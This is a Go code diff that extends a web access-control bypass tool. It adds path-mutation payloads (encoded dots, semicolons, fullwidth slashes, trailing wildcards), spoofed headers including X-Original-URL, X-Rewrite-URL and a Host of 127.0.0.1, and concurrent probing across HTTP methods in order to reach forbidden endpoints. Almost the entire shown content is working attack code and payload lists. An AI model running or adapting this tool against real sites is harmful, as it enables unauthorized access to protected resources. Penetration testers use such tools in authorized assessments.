@@ -25,6 +25,10 @@ var (
 		"X-Forwarded-Host",
 		"X-ProxyUser-Ip",
 		"X-Remote-Addr",
+		"Host",
+		"X-Rewrite-URL",
+		"X-Original-URL",
+		"Referer",
 	}
 	Red   = Color("\033[1;31m%s\033[0m")
 	Green = Color("\033[1;32m%s\033[0m")
@@ -72,37 +76,46 @@ func getValidDomain(domain string) string {
 	return trimmedDomain
 }
 
-func constructEndpointPayloads(domain, path string) []string {
+func constructEndpointPayloads(path string) []string {
 	return []string{
-		domain + "/" + strings.ToUpper(path),
-		domain + "/" + path + "/",
-		domain + "/" + path + "/.",
-		domain + "//" + path + "//",
-		domain + "/./" + path + "/./",
-		domain + "/./" + path + "/..",
-		domain + "/;/" + path,
-		domain + "/.;/" + path,
-		domain + "//;//" + path,
-		domain + "/" + path + "..;/",
-		domain + "/%2e/" + path,
-		domain + "/%252e/" + path,
-		domain + "/%ef%bc%8f" + path,
+		"/" + strings.ToUpper(path),
+		"/" + path + "/",
+		"/" + path + ".json",
+		"/" + path + "/.",
+		"//" + path + "//",
+		"/./" + path + "/./",
+		"/./" + path + "/..",
+		"/;/" + path,
+		"/.;/" + path,
+		"/" + path + "?",
+		"/" + path + "%20/",
+		"/%20" + path + "%20/",
+		"//;//" + path,
+		"/" + path + "/*",
+		"/" + path + "..;/",
+		"/%2e/" + path,
+		"/%252e/" + path,
+		"/%ef%bc%8f" + path,
 	}
 }
 
-func penetrateEndpoint(wg *sync.WaitGroup, httpmethod string, _url string, header []string) {
+func penetrateEndpoint(wg *sync.WaitGroup, httpmethod string, _domain string, _path string,header string) {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+
 	defer cancel()
 	defer wg.Done()
-
+	
+	_url :=  _domain+_path
 	req, err := http.NewRequestWithContext(ctx, httpmethod, _url, nil)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
-
 	var h string
-	if header != nil {
-		for _, e := range header {
-			req.Header.Set(e, headerValue)
+	if header != "" {
+		if header == "Host"{
+			req.Host = "127.0.0.1"
+		}else{
+			req.Header.Set(header, headerValue)
 		}
+
 	}
 
 	resp, err := http.DefaultClient.Do(req)
@@ -115,12 +128,57 @@ func penetrateEndpoint(wg *sync.WaitGroup, httpmethod string, _url string, heade
 	defer resp.Body.Close()
 
 	if resp.StatusCode != 200 {
-		log.Println(Red(h, " ", _url, " ", httpmethod, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+		if header != "" {
+			log.Println(Green(h, " ", _url, " ", header, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+		}else{
+			log.Println(Green(h, " ", _url, " ", httpmethod, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+
+		}
+	
 	} else {
-		log.Println(Green(h, " ", _url, " ", httpmethod, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+		if header != "" {
+			log.Println(Red(h, " ", _url, " ", header, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+		}else{
+			log.Println(Red(h, " ", _url, " ", httpmethod, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+
+		}
+		
 	}
 
 }
+
+func penetrateEndpoint1(wg *sync.WaitGroup, httpmethod string, _domain string, _path string,header string) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+
+	defer cancel()
+	defer wg.Done()
+	
+	_url :=  _domain+"/"
+	req, err := http.NewRequestWithContext(ctx, httpmethod, _url, nil)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
+	req.Header.Set(header, _path)
+	
+	resp, err := http.DefaultClient.Do(req)
+	var h string
+	if err != nil {
+		log.Println(Red(h, " ", _url, " ", httpmethod, " ERROR", " (", " ", ")"))
+		return
+	}
+
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		
+	log.Println(Green(h, " ", _url, " ", header, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+
+	} else {	
+	log.Println(Red(h, " ", _url, " ", header, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
+	}
+
+}
+
+
+
 
 func main() {
 
@@ -137,7 +195,7 @@ func main() {
 
 	validDomain := getValidDomain(*domain)
 	validPath := strings.TrimSpace(*path)
-	endpoints := constructEndpointPayloads(validDomain, validPath)
+	endpoints := constructEndpointPayloads(validPath)
 
 	showBanner()
 
@@ -147,23 +205,32 @@ func main() {
 	fmt.Println(Cyan("\nNormal Request"))
 
 	var wg sync.WaitGroup
+	fmt.Println(Cyan("\nRequest with HTTP Methods"))
 	wg.Add(len(httpmethods))
 	for _, httpmethod := range httpmethods {
-		go penetrateEndpoint(&wg, httpmethod, validDomain+"/"+validPath, nil)
+		go penetrateEndpoint(&wg, httpmethod, validDomain,"/"+validPath, "")
 	}
 	wg.Wait()
 
+	fmt.Println(Cyan("\nRequest with Endpoints"))
 	wg.Add(len(endpoints))
 	for _, e := range endpoints {
-		go penetrateEndpoint(&wg, http.MethodGet, e, nil)
+		go penetrateEndpoint(&wg, http.MethodGet,validDomain,e, "")
 	}
 
 	wg.Wait()
 
 	fmt.Println(Cyan("\nRequest with Headers"))
-	// wg.Add(1)
+	wg.Add(len(headerPayloads))
 
-	go penetrateEndpoint(&wg, http.MethodGet, validDomain+"/"+validPath, headerPayloads)
+	for _, h := range headerPayloads {
+		if h == "X-Rewrite-URL" || h == "X-Original-URL" {
+			go penetrateEndpoint1(&wg,http.MethodGet,validDomain,"/"+validPath, h)
+		}else{
+			go penetrateEndpoint(&wg,http.MethodGet,validDomain,"/"+validPath, h)
+		}
 
-	// wg.Wait()
+		
+	}
+	wg.Wait()
 }
